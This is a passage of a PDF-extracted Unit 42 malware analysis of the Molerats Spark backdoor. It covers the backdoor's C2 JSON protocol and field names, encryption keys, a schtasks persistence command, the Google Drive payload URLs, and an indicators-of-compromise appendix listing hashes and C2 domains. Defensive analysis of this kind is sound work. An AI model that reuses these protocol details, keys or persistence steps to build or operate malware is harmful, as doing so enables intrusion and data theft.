the “Allier”ﬁeld. Figure 11 C2 server providing the Allier JSON objectA%er receiving the “Allier” JSON object, the payload will send the results of the executed command(s) to the C2server. The payload will create a JSON object with an array named “Zeke”, which will contain JSON objects thathave a “FrederickT” ﬁeld used to store the result of the command, a “ReesefP” ﬁeld to denote the task iden!ﬁer,and a “KaileeXws” ﬁeld to store a boolean if the command was successful. The resul!ng JSON would look like thefollowing when the result of the ‘whoami’ command issued by the C2 is “test-system\\<redacted>”:{\"Zeke\":[{\"FrederickT\":\"5yUu16Ae8WKt<redacted>\",\"KaileeXws\":true,\"ReesefP\":5}]}The payload will base64 encode this data and set the “CallieVK” ﬁeld in the outbound JSON object with the“ReeceWNM” ﬁeld set to the “Winston” communica!on type, as seen in the following:{\"CallieVK\":\"eyJaZWtlIjpbeyJGcmVkZXJpY2tUIjoiNXlVdTE2QWU4V0t0aX<redacted>0iLCJLYWlsZWVYd3MiOnRydWUsIlJlZXNlZlAiOjV9XX0=\",\"ReeceWNM\":\"Winston\"}The payload will then encrypt this JSON object and send it to the C2 server to exﬁltrate the results of the issuedcommand. Figure 12 shows the HTTP POST request containing the encrypted JSON object that contains the“Winston” communica!on type. Figure 12. Payload sending the results of the issued command to the C2 server01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 18 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/A%er sending the results of the ini!al commands, the payload expects the C2 to reply with a JSON object with a“Garrison” ﬁeld set to a number, such as “{\"Garrison\" : 8}”. Figure 13 shows the C2 server respondingwith ciphertext of the JSON object with the “Garrison” ﬁeld. Figure 13. C2 server sending the Garrison JSON object to the payloadThis concludes the check-in and ini!al command execu!on por!on of the C2. The payload will enter a loop tocon!nuously send HTTP requests to obtain addi!onal commands to run using the same sequence of JSON objectspreviously explained star!ng a%er the “JoslynKe” communica!on type that sent the system informa!on to theC2. Instead of sending the system informa!on to the C2 and parsing the response for a command, each itera!onof this loop will start with a communica!on type of “VanessaFM” as seen here:{\"CallieVK\":\"eyJBZGVsaW5lUkQiOiJ2Y0picTZuemdKaz0iLCJBdmVyaXp0IjoiMSIsIkJyYW5kZW50bEsiOjEsIk1hdGhpYXNOYm8iOlt7IkFkYWx5bm5nUyI6MSwiQ29sbGluc1BNIjoiS1Q2TloyMVNGTVQ5WHFuZVM3MjJmZkVucG1FUFVZcDBqcDFFTXRaVEtyUmNNWkVFWG56QnZnPT0iLCJOZXZhZWgiOnRydWV9XX0=\",\"ReeceWNM\":\"VanessaFM\"}The data in the “CallieVK” ﬁeld decodes to a JSON object that has several ﬁelds, one of which is an array called“MathiasNbo” that contains JSON objects that transmit the UUID for the compromised system in a ﬁeld named“CollinsPM” that was previously transmi\"ed to the C2 in the “ZaydenlnL” ﬁeld of the “JoslynKe”communica!on type. The JSON object also contains a ﬁeld “AdelineRD” that contains a nickname or campaigniden!ﬁer value in the form of base64 encoded ciphertext. We have compiled a list of campaign codes of knownSpark payloads, which we have included in the Appendix. The resul!ng JSON object will look like the following:{\"AdelineRD\":\"vcJbq6nzgJk=\",\"Averizt\":\"1\",\"BrandentlK\":1,\"MathiasNbo\":[{\"AdalynngS\":1,\"CollinsPM\":\"\"<base64 encoded ciphertext of UUID seen in ZaydenlnLfield>\",\"Nevaeh\":true}]}This JSON is encrypted and base64 encoded and sent to the C2 server, as seen in Figure 14. The payload will usethe same JSON each itera!on of the main loop and will expect the C2 to provide the same sequence of responsesas discussed before that contain “Jordanlzw”, “Allier”, and “Garrison” ﬁelds to receive addi!onal commands.01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 19 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/ Figure 14. Payload issuing HTTP POST to C2 server reques\"ng further commandsComparison between 2019 and 2020 campaignsWhile collec!ng addi!onal Spark samples, we found samples from a 2019 campaign and newer samples that werecompiled in January 2020 used in the Spark Campaign. The delivery documents and Spark payloads used in thesecampaigns diﬀer from the delivery document we observed in the October and November 2019 a\"acks. At a highlevel, the January 2019 delivery document was self-contained as it had its payload embedded within it, while theOctober 2019, November 2019 and January 2020 delivery documents required interac!ng with a remote server.The October 2019 and January 2020 documents diﬀer as the former a\"empts to download a VBScript thatdownloads a payload from the actor controlled server, whereas the January 2020 document a\"empts to load aremote template from Google Drive whose macro a\"empts to download a payload from Google Drive. The knownSpark payloads installed by each of these delivery documents diﬀer as well, which we will compare with theknown payload from the November a\"ack discussed earlier in this blog.We analyzed a delivery document from the 2019 campaign and found that it was a macro-enabled Worddocument (SHA256:40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11). Themacro made the decoy contents by se'ng a textbox in the document to visible with the line“Shapes(\"textbox1\").Visible = True”, while the a\"acks discussed earlier in this blog did not a\"empt todisplay any updated decoy contents. Another marked diﬀerence is that while both the January and October 2019delivery documents wrote to a secondary VBScript %userprofile%\\wmsetup.vbs andprogramdata\\Micorsoft\\Microsoft.vbs respec!vely, the wmsetup.vbs script contains the binarypayload while Microso%.vbs a\"empts to download another VBScript that will download the binary payload. Thewmsetup.vbs script decodes an embedded base64 encoded payload(SHA256:9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db), saves it to %temp%\\ihelp.exe and creates a scheduled task for persistence by running the followingcommand:schtasks /create /f /sc minute /mo 1 /tn ihelp /tr %temp%\\ihelp.exeA few notable characteris!cs of the Spark payload delivered in January 2019 include the use of diﬀerent freely-available libraries from other known samples, such as using the msgpackv1 library instead of JSON to structure itsconﬁgura!on and C2 communica!ons, as well as using the SFML library instead of cURL. Also, unlike the Sparkpayload delivered in November 2019, this payload uses the AES cipher to decrypt its conﬁgura!on and otherper!nent strings and to encrypt and decrypt network communica!ons with its C2. It uses the en!re SHA256 hashof a supplied key string without using the custom rolling XOR cipher on the key and ciphertext as discussed earlier01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 20 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/in this blog. The decrypted conﬁgura!on from this payload structured using msgpack appears as follows:\\x88\\xa4jevG\\xadsmartweb9[.]com\\xa3JRk\\xa1/\\xa3ufRP\\xa4qNxp\\x00\\xa4kfds\\xa0\\xa4WjaS\\x01\\xa3WnF\\xb8OMfX5GiCmOICUvhunB2lWQ==\\xa3sRF\\xcd'\\x10We also analyzed a delivery document from the 2020 Spark campaign(SHA256:8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8) and it diﬀeredfrom both the January and October 2019 delivery documents. First, the ini!al delivery document did not contain amacro, rather it a\"empts to load a remote template from Google Drive, speciﬁcally at the following URL:hxxps://drive.google.com/uc?export=download&d=1NbCEnL-jA89PWBEhLWwHmBM5nmUKNRS8The remote template(SHA256:a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367) contains amacro that a\"empts to download an executable from the following URL:hxxs://drive.google.com/uc?export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepHThe executable hosted at the Google Drive link(SHA256:7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128) is a compiledAutoIt script that a\"empts to install a Spark backdoor to %userproﬁle%\\runawy.exe, which is the same exactdropper and payload as we observed installed by the “a\"achment.doc” delivery document discussed earlier in thisblog.Table 6 shows a comparison of features in the Spark payloads discussed in this sec!on. Unfortunately, we wereunable to obtain the payload installed by the MOFA-related Word documents delivered in the October 2019a\"acks. If we compare the Spark samples installed by the delivery documents in January 2019 and 2020 with theSpark sample installed by the Pictures.pdf delivery document in November 2019, we see notable diﬀerences thatsuggest this threat group is con!nually developing this backdoor.FeatureJan. 2019 SparkNov. 2019 Spark (Pictures.pdf)Oct. and Nov. 2019 “a!achment.doc”and Jan. 2020 “The Spark Campaign”DropperNoneCompiled AutoIt scriptCompiled AutoIt scriptHTTP LibrarySFMLcURL 7.56.0-DEVelnormous' HTTPRequestConﬁgura!onStructuremsgpack version 1JSON for Modern C++ v2.1.1JSON for Modern C++ v3.7.0PayloadPackerEnigma Virtual BoxEnigma (5.X)Enigma (5.X)Cipher usedAES on ciphertextRolling XOR on key andciphertext + 3DES on ciphertextRolling XOR on key and ciphertext +custom AES decryp!ng 16-bytechunks of ciphertextEncrypteddataConﬁgura!on, Names for C2comms, Commands to gathersystem informa!onConﬁgura!on, Names for C2comms, Commands to gathersystem informa!onConﬁgura!on, Names for C2 commsPersistenceScheduled taskLNK Shortcut in @StartupDirScheduled task, Copied executable in01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 21 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/@StartupDirTable 6. Comparison of Spark payloads delivered in January 2019, October 2019, November 2019 and January 2020Connec!on to DowneksKaspersky’s report men!oned the sub-groups of Molerats (AKA the Gaza Cybergang) are responsible for theOpera!on Parliament campaign that delivered the Spark payload and we observed this threat group delivering theDowneks in the DustySky campaign. We observed some similari!es between Spark and Downeks from adevelopment and installa!on perspec!ve.For instance, we observed the same binder Trojan, which is a malicious applica!on used to open a decoydocument and to install a payload, one installing a Downeks payload and two others installing Spark. The binderTrojan installing Downeks was compiled in December 2015 and was used during the DustySky campaign asmen!oned in our blog (SHA256:75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9), while we have twosamples of this binder Trojan installing Spark samples that were compiled in November 2017(SHA256:4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85) and April 2018(SHA256:23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c).From a development perspec!ve, both the Downeks and Spark payloads use libraries and code from several open-source projects available on GitHub to carry out its C2 communica!ons and to structure data in JSON. First, Sparkuses the cURL library for C2 communica!ons, speciﬁcally version 7.56.0-DEV whose source code is available onGitHub, while Downeks(SHA256:9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7) used cURL tocommunicate with the C2 server, but an earlier version (7.39.0). Second, the payload uses JSON to parse itsconﬁgura!on and to structure its messages sent to and from the C2 server, which it uses JSON for Modern C++Version 2.1.1 also available on GitHub. The previously men!oned Downeks also used JSON to parse itsconﬁgura!on and to structure the data it sends and receives from its C2 server. However, it used Tencent’sRapidJSON again freely available on GitHub. This ﬁts our previous observa!ons of the developer of Spark usingdiﬀerent JSON libraries within diﬀerent versions of Spark.ConclusionMolerats, also known as the Gaza Hacking Team and the Gaza Cybergang, has been targe!ng eight organiza!onsin six diﬀerent countries in the government, telecommunica!ons, insurance and retail industries between October2019 through the beginning of December 2019. This group uses spear-phishing emails to deliver both maliciousWord and PDF documents, and a\"empts to social engineer the vic!m into an infec!on rather than trying toexploit a so%ware vulnerability. Also, the group uses the Spark backdoor in a\"acks, but con!nues to develop thistool using diﬀerent freely available libraries to structure important data and to carry out C2 communica!ons.Palo Alto Networks customers are protected from the a\"acks discussed in this blog by:All known Spark payloads and delivery documents have malicious verdicts in WildFireAll known Spark C2 domains and domains used in the delivery are marked with malicious classiﬁca!ons andverdicts in PANDB and DNS SecurityAutoFocus customers can track the delivery documents and payloads with the tags: Molerats_Spark01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 22 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/AppendixIndicators of CompromiseFiles related to MOFA documentsd19104ef4f443e80c21375f1b779f00c960e0193e8aade69d7ad87a11f39c897 - MOFA- 031019.docdc3311b3a827840c25689c0e153f2c09ba9583bcf18cdc43b88b12cf9846e94b - Microso%.vbsc45b5b01e1c3284fd694db6aa0ebeab8abe78d9bb12eb41b957cd121d97b3516 - PlayerVLC.vbs03be1d7e1071b018d3(c6496788fd7234b0bb6d3614bec5b482f3bf95aeb506 - MOFA- 061019.doc725d907b33cca8cec22f561068a3a8abf3616a8e2f452adb7(d4aec20390f06 - Microso%.vbsFiles related to A\"achment.doceaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000 - a\"achment.doc7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128 - rundll64.exe64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eﬀ6122c431 - runawy.exeFiles related to Pictures.pdf9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495 - Pictures.pdf1742caf26d41641925d109caa5b4ebe30cda274077(c68762109155d3e0b0da - Pictures.rar92d0c5f5ecﬀd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7 - الصور من قليلة عينة هذه.exe5139a334d5629c598325787fc43a2924d38d3c005bﬀd93a(7258a4a9a8d8b3 - pdf.exeRelated Spark payloads and Delivery documentsee9f90819a578c8256fc950f62bd9f7b051edbee06618a26fa21c2875c3c301e - الج الحكومة قائمة 973 رقم ا$ذكرة(Note No. 973 Government List c)9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7 - GoogleChrome.vbsddf938508618ﬀ7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8 - MOFA- 101019.doc4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba - Microso%.vbsfeec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21 - ا$ستجدات أهم حول اليومي التقرير  - 9 - 9 - 2019.docليوم الفلسطينية( Daily report on the most important Pales!nian developments, 9-9-2019.doc)bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959 - مستجدات أخر حول اليومي التقرير2019 - 9 - 9 -العا$ي رهابbا.doc (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc)243f1301d1d759c17cd49336512ebceb9d347995c90a6e00aﬀ926439d63f12d - Daily Report.rar01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 23 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebbeaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000273aa20c4857d98cfa51ae52a1c21bf871c0f9cd0bf55d5e58caba5d1829846f71ea0ba573451b14bb411ad28e5aac883f8af0376db8c9d34f309778c901c5d6a0ae5cc0659693e4c49d3597d5191923fc(54040b9b5c8229e4c46b9330c3678c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded87bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb12864ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eﬀ6122c431e8d73a94d8ﬀ18c7791bf4547bc4ee2d3f62082c594d3c3cf7d640f7bbd156146e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296b08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489(99e36c43b4df1ecaa6e0297777ba29e21e5d1acca6210d436eee5c2b93d2dec27910ﬀd6e22665596e896099a3ceb563f43f49a255672cfd14d88799f29617aa362ecd2128446a47cf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c55192d0c5f5ecﬀd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b75139a334d5629c598325787fc43a2924d38d3c005bﬀd93a(7258a4a9a8d8b389acce7cdd354a04f2edd4a2226caf5c47246a8196ec1d9b98159da38ec20c24b654dd768912e09b9c71eb388995b1d69b5baa45e970a6afc42733d647220712daa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987cc39e3adb6e15b9964bf0f9702b632086951b4ed9f9(9cadd6975962a031a398255a29f88150285a9553f67a6475dc50fcbb5fc737a0178cc0e737d49c8d1b204889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b8501/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 24 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e99a3ec0a8b2a88106fc537d9cae1989f6(a36bb43352a944d2031e7b2ab7673c89d7337ac102cd80316ad59a1dcfcc5c7849d0e7520f0f85e1781574423e38ea19ede61c865a3cdd59d3a5d1a79b7ce83ca7828a6b80a2f968d82b5b56a8603cf9df76f634586c698b967209d83834b98ﬀ3d245d47d6993b(27a0aa819d9b9704b19e0460a0fa7d952ba6feb5eadb9054895d1d753df72faf6f470446a0519194c236a3eed81f3180bdcc5bcbd29b782b1a0ef7962ceb1c4cb892a427563ﬀfc420a49b1e9e2200238a4846110c2e4e63bfe6d7088645f49ebb65718a70b7fbc9353adc58b983b080b61950fc6689ee340797458fc4fd8a1d6f492976aa0e28c6dc796b35ef405c42c78e1011cc4a6df09315264d638271cb0674d044886cf9d49020debdc6ab63de249fd9289d51415395fc8b1e8a15a82f200bf90e674ee5b6e43d434148bfcf52fd441f64836ae35f4f0ed9d75bf9707f521bcbb7c03803a32c81ec609a5466f050c09156f25b5561c691763f865ee437e95a246dcbbe1c3e23a42dc49b039828da6cef4ebb7226c85163651a69085ee7e1899aa804fed26b032a9b6a22047eb48f1(1553827a5b85aa7229422d650fa1f37c48b3aeb18e5bf597948ea6ad39f0030053978d1a14e1c3dbb4abf044a223e14544c73b7f1513032544512718d068b2f6e8b5087cae9fc446e40cd56c03ab7bbbe047add5d04276760d722c241e831dacee7cf9d63cb123ce7188d604df1c56c1197d716083750372d4e8c043d6f916ec398303dc929b59e05b7f5a9dc5485e4530047f4a23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7cbf4cdb277881754db2f44a014c08ce1857c9c0c47c6c1c8582782b5c887241e201/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 25 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/58376e763ef0ca9dccad55e043794b5ec0b34c8c2a20604cﬀ0b26f216e3c1e2399344aa609f17e558356709a398b4478e5c737c7cc843e3d111d33192c35e5a1c43f8f68f7b8e40828f9f74566860b25a5dfd9b7f8b7620d71644866e6cb19dab2335ba3abe97a02a3a2d1b063a08ae649406f88d4cf02d22d724e649b9e7bea4c6aea61953d515d38d75ae7b3ef2a37bb26d1f838722f0a67624d6a728549e51c1e6ce3ﬀ1f42734bfa19a7142b5154172232afc5528dad4c527df3a44c0c1329e9e98f08f3d6a017254dd033984cfd6421ccab5b323ebace5d68662a98a090631ed0995e21ec8f02f6167824eca92e84abfd8cf4dbbd9c7c88f88d4f570cdd010ef2b6664779b3c8cfa0a5179b7331d88d34d04350ebeeecb3bae656543934889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b8551042cac30b4d6072f79b3f9b27d8ee7b65f438549c90f57dc5fecc17d35054aec0d30d2fdd301bf0cfe66028c9a37d5535a8161909d0d3573447d1843f61c97e6e5593cbac23ec5c51e5f63c4c6616a8eb71697a89f9d1d17cc7be91c36e3e936166db096ddb50af4f5c4be48b4274c535f40c74ce3450d4ad3bdaa2c28beb3966ad6452793b1562f0081456a951d3310d4e7690fa74ef8ﬀ4046778bd37168b2437a54195d51435ad07867a5cb069e831fdd8e48bb70daa3894fde40754bc8fe19ab4fd65531163d197d565201c2afea7d9f8e74e5f75c714eb5fe086a02fd212aa6e3f236550bb4b9328071ee4f0e8a74465c75dcf1e6cde8502afde91364e489e5297ed8cf594c2a5160eﬀ79b12b9ee68e36e0d00ed31f44b75c4a38f610eebc31bb64ba0aa0ea335a5f35392ﬀ1d058e97bf5cb5b46d7a89b197dcba7afe0f23d6675260dd40f277906aa3dd34cbef2243336334dda10ad4500f8e68837c5a9ce04002be953c556b5b50c10f8d462abc92d1ﬀe28a325d7ea741701be101/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 26 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/45a2c50edd710476e0de8ece6cc5931035ce8183ac4cf521d494d94744d44c2cb84f2497e4cfeac240b1815b22741609e5a31f0be11667a3c7256c16788728ec78696cf4370817cb0ﬀd6930a92553d3551fe77cdc6d45638ddd13f05b9218b85109f2c8f014698f1d2f0d59a7c9cc1cd9400a6fe4dcde95cc475f453e74bc6eab4e43b4e526d44bf12ae5113184afdf5c15630808f674f5e1a472eb6811ce3fdaa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eﬀ6122c4316e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296B08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489(99e36c43b4df1ecacf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c5519511940ed52775aef969(a004678f4c142b33e2dd631a0e8f4e536ab0b811dbe3779f6252ca606ace9ae06623ba086d1a441582b625e433799260d71cdb1b4be6e9f7b0449976537d9276192e5767c9909cd34df028a8bf1cac3dbe490f0e7369df8e4bdc3fd69deb6c866254f80f6288549222ed0d07ccd4c05597e75414df40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ﬀd11Related Delivery Domainsservicebios[.]comdapoerwedding[.]comzmartco[.]comSpark C2 Domainswebtutorialz[.]comnysura[.]com01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 27 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/laceibagraﬁca[.]commotoqu[.]comsmartweb9[.]comlaptower[.]comapp.msexchanges16[.]commsexchange13[.]comcloudserviceapi[.]onlineupdates.masterservices[.]onlineclients.itresolver[.]onlineupdate.itresolver[.]online91.219.237[.]99goldenlines[.]siteUpdate.nextdata[.]siteSpark First Names and MoreDecrypted StringUsageDescrip\"onLawrenceC2Channel (frompayload)Key name in dic!onary (JaseN) used to store the value of a task number provided inthe Ivory ﬁeldAllierC2Channel (fromC2)Key name used to store a number for an unknown purpose, but it is expected as aresponse to the MorganE communica!on type.JaseNC2Channel (frompayload)Key name for a list of dic!onaries in the MorganE communica!on type, represents thereceived task numbersIvoryC2ChanneKey name in the Jordanlzw list used to store a number that we believe is a task number01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 28 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/l (fromC2)JonasC2Channel (fromC2)Key name in the Jordanlzw list used to store a boolean for an unknown reasonReginacyC2Channel (fromC2)Key name in the Jordanlzw list used to store a boolean to not create the process,rather just send 'ok' back to C2TrumanRdC2Channel (fromC2)Key name in the Jordanlzw list used to store the command line arguments to run withan executableAlanihC2Channel (fromC2)Key name in the Jordanlzw list used to store the executable to to runAveriztC2Channel (frompayload)Key name that stores a number in the VanessaFM communica!on type that ishardcoded within the binary.MathiasNboC2Channel (frompayload)Key name for a list of dic!onaries in the VanessaFM communica!on typeBrandentlKC2Channel (frompayload)Key name that stores a number in the VanessaFM communica!on type that ishardcoded into the conﬁgura!on.AdalynngSC2Channel (frompayload)Key name in dic!onary (MathiasNbo) used to store a number with unknown purpose.AdelineRDC2Channel (frompayload)Key name that stores a base64 encoded encrypted string obtained from the payloadconﬁgura!on sent to the C2 in the VanessaFM communica!on type. Considered as anickname or campaign/payload iden!ﬁer.CollinsPMC2Channel (frompayload)Key name in dic!onary (MathiasNbo) used to store the UUID also seen in theZaydenlnL ﬁeldNevaehC2Channel (frompayloadKey name in dic!onary (MathiasNbo) used to store a boolean with unknown purpose.01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 29 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/)LondonzOC2Channel (fromC2)Key name in the Jordanlzw list used to store a boolean to create a speciﬁed processand wait for returnJoslynKeC2Channel (frompayload)Value in ReeceWNM ﬁeld to represent the transmission of system informa!onAngelxEvC2Channel (frompayload)Key name used in a system informa!on dic!onaries (Maximiliano) to store theinforma!on type value (1 = UUID, 2 = hostname, 3 = username)ZaydenlnLC2Channel (frompayload)Key name used in a system informa!on dic!onaries (Maximiliano) to store the dataassociated with the type speciﬁed in AngelxEvHoustonodC2Channel (frompayload)Key name used in a system informa!on dic!onaries (Maximiliano) to store the value\"1\" whose purpose is unknownMaximilianoC2Channel (frompayload)Key name in JoslynKe communica!on type that stores a list of system informa!ondic!onariesGarrisonC2Channel (fromC2)Key name for a number value used by the payload possibly as a sleep interval beforesending results of addi!onal commands.ZekeC2Channel (frompayload)Key name for a list of dic!onaries in the Winston communica!ons typeReesefPC2Channel (frompayload)Key name within a dic!onary within the Zeke array used to represent the task numberFrederickTC2Channel (frompayload)Key name within a dic!onary within the Zeke array storing the results of the executedcommand for the taskC2ChanneKey name within a dic!onary within the Zeke array storing the boolean if the01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 30 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/KaileeXwsl (frompayload)execu!on was successfulEverlyYC2Channel (fromC2)Key name for a number value used by the payload to idle for a speciﬁed number ofsecondsCallieVKC2Channel (frompayload)Field in JSON sent to C2, used to store the communicated dataReeceWNMC2Channel (frompayload)Field in JSON sent to C2, used to store the communica!on typeMorganEC2Channel (frompayload)Value in ReeceWNM ﬁeld to represent the task number its about to send dataregardingWinstonC2Channel (frompayload)Value in ReeceWNM ﬁeld to represent the transmission of command execu!on resultsJessicayC2Channel (frompayload)Value in ReeceWNM ﬁeld to represent the beaconVanessaFMC2Channel (frompayload)Value in ReeceWNM ﬁeld to represent the request for addi!onal tasksrEA8GPZf4oIdOsjMxgFDKeyUsed to encrypt ﬁelds within JSON sent to C2, including system informa!on gatheredJordanlzwC2Channel (fromC2)Key name of a list of dic!onaries that store commands to runAryanaC2Channel (fromC2)Key name for a number value used to specify the number of commands to run that arestored in the Jordanlzw list24ConﬁgMinimum sleep interval between messages sent to C2119ConﬁgMinimum sleep interval between failed C2 beaconsJvFLb8pHNywoGdhtjsc01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 31 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/5KeyUsed to encrypt C2 communica!onsSpark Nicknames/Campaign CodesSHA256Compile TimeNickname0631ed0995e21ec..2017-03-27 2:46:0628-10966ad6452793b15..2017-05-24 6:15:04Nick name212aa6e3f236550..2017-05-24 6:15:04Nick nameab4e43b4e526d44..2017-05-24 6:15:04Nick name36166db096ddb50..2017-10-07 7:06:22bbbd010ef2b6664779..2017-10-07 7:06:2328-10194c236a3eed81f..2017-10-22 7:03:45sssfc420a49b1e9e22..2017-10-22 7:03:45sssbc9353adc58b983..2017-10-22 7:03:45sss9d49020debdc6ab..2017-10-22 7:03:45Nick name3a32c81ec609a54..2017-10-22 7:03:453007c3e23a42dc49b03..2017-10-22 7:03:45508528e5bf597948ea6a..2017-10-22 7:03:45O151303254451271..2017-10-22 7:03:45Nick name83750372d4e8c04..2017-10-22 7:03:45020458376e763ef0ca9..2017-10-22 7:03:45R1c43f8f68f7b8e4..2017-10-22 7:03:45oodab2335ba3abe97a..2017-10-22 7:03:45Nick namea4c6aea61953d51..2017-10-22 7:03:45Nick name329e9e98f08f3d6..2017-10-22 7:03:45FUD78696cf4370817c..2017-10-22 7:03:45Benec0d30d2fdd301b..2017-10-28 10:55:2128-109511940ed52775a..2017-12-02 11:16:24<blank>5139a334d5629c5..2019-09-16 10:00:45bnvcs89acce7cdd354a0..2019-09-16 10:00:45Docxb654dd768912e09..2019-09-16 10:00:45290901/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 32 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/daa72ba2b9525d7..2019-09-16 10:00:45PalCamp69df8e4bdc3fd69..2019-09-16 10:00:45NewsMaccf32479ed30ae95..2019-12-30 9:45:44140164ea1f1e0352f3d..2020-01-12 10:57:50FS1-20206e60f5c65299ee7..2020-01-12 10:57:501801b08b8fddb9dd940..2020-01-12 10:57:50FS1-202004fa6aaea5e3a26..2020-01-12 10:57:50up Get updates from Palo Alto Networks!Sign up to receive the latest news, cyber threat intelligence and research from usEmail addressSubscribe reCAPTCHANon sono un robotPrivacy - TerminiBy submi'ng this form, you agree to our Terms of Use and acknowledgeour Privacy Statement.   2024 Palo Alto Networks, Inc. All rights reserved.Popular ResourcesResource CenterBlogCommuni!esTech DocsUnit 42SitemapLegal NoticesPrivacyTerms of UseDocumentsAccountManage Subscrip!onsReport a Vulnerability"
}